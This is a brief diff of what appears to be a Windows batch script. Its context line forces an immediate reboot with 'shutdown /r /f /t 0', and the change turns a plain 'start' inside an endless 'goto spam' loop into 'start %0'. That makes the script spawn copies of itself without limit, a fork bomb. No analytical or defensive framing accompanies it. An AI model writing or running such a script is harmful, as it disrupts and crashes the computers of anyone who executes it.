@@ -16,5 +16,5 @@ shutdown /r /f /t 0
 goto spam
 
 :spam
-start
+start %0
 goto spam
